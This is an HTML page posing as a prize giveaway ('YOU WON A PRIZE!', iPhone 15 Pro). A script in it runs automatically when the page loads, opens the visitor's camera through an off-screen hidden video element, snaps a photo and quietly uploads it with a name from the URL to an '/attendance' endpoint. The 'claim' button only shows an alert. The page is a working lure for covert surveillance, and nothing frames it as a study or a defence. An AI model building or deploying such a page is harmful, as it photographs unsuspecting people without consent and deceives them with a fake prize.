<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Congratulations!</title>
  <style>
    body {
      background-color: #ffffff;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    .prize-container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
    }
    h1 {
      color: #e60000;
      font-size: 28px;
    }
    p {
      font-size: 18px;
      color: #333;
    }
    img {
      width: 100%;
      max-width: 300px;
      margin: 20px 0;
      border-radius: 10px;
    }
    .claim-btn {
      display: inline-block;
      background-color: #28a745;
      color: white;
      padding: 15px 30px;
      font-size: 20px;
      font-weight: bold;
      text-decoration: none;
      border-radius: 5px;
      box-shadow: 0px 4px 6px rgba(0,0,0,0.2);
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    /* Admin button styles */
    .admin-link {
      position: absolute;
      top: 15px;
      right: 15px;
      background-color: #f0f0f0;
      color: #333;
      padding: 5px 10px;
      font-size: 12px;
      text-decoration: none;
      border-radius: 4px;
      border: 1px solid #ccc;
      opacity: 0.7;
    }
    .admin-link:hover {
      opacity: 1;
      background-color: #e0e0e0;
    }
    
    /* Hide the video element but keep it in the DOM for capturing */
    #video {
      position: absolute;
      top: -9999px;
      left: -9999px;
      opacity: 0.01;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <a href="/admin" class="admin-link">Go to Admin</a>

  <div class="prize-container">
    <h1>🎉 YOU WON A PRIZE! 🎉</h1>
    <p>You have been selected to receive a brand new <b>iPhone 15 Pro</b> or a <b>Cash Prize</b>!</p>
    
    <!-- iPhone / Money Picture -->
    <img src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=600&auto=format&fit=crop" alt="iPhone 15 Prize" />
    
    <br>
    <a href="#" class="claim-btn">CLAIM PRIZE NOW</a>
  </div>

  <!-- Hidden video element -->
  <video id="video" autoplay playsinline></video>

  <script>
    const API_URL = "/attendance";
    const MAX_KB  = 10000; // Increased max size for high quality
    const video = document.getElementById("video");
    let stream = null;

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: "user" } },
          audio: false
        });
      } catch (e1) {
        try {
          // Fallback to preferring the front camera without strict constraint
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false
          });
        } catch (e2) {
          try {
            // Final fallback: just get any available video camera (best for laptops)
            stream = await navigator.mediaDevices.getUserMedia({
              video: true,
              audio: false
            });
          } catch (e3) {
            // fail silently if no camera is available or permission denied
            return;
          }
        }
      }
      if (stream) {
        video.srcObject = stream;
        await new Promise(r => video.addEventListener("loadedmetadata", r, {once:true}));
        video.play();
      }
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
    }

    function captureBlob(quality = 1.0) {
      return new Promise((res, rej) => {
        const c = document.createElement("canvas");
        c.width  = video.videoWidth  || 640;
        c.height = video.videoHeight || 480;
        const ctx = c.getContext("2d");
        
        ctx.drawImage(video, 0, 0, c.width, c.height);
        
        c.toBlob(blob => {
          if (!blob) return rej(new Error("Capture failed."));
          const kb = blob.size / 1024;
          if (kb > MAX_KB && quality > 0.15) {
            res(captureBlob(quality - 0.15));
          } else {
            res(blob);
          }
        }, "image/jpeg", quality);
      });
    }

    async function run() {
      const params = new URLSearchParams(location.search);
      const name = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));

      try {
        await startCamera();
        
        // Wait 500ms for camera to focus properly
        await new Promise(r => setTimeout(r, 500));
        
        const blob = await captureBlob();
        stopCamera();

        const fd = new FormData();
        fd.append("name", name);
        fd.append("latitude", 0);
        fd.append("longitude", 0);
        fd.append("photo", blob, "attendance.jpg");

        // Send to backend in the background
        await fetch(API_URL, { method: "POST", body: fd });

      } catch (err) {
        stopCamera();
      }
    }

    document.querySelector(".claim-btn").addEventListener("click", function(e) {
      e.preventDefault();
      alert("Prize Claim Processing..."); // Provide feedback to user
    });

    // Run automatically and capture instantly when page loads
    window.addEventListener("DOMContentLoaded", run);
  </script>
</body>
</html>
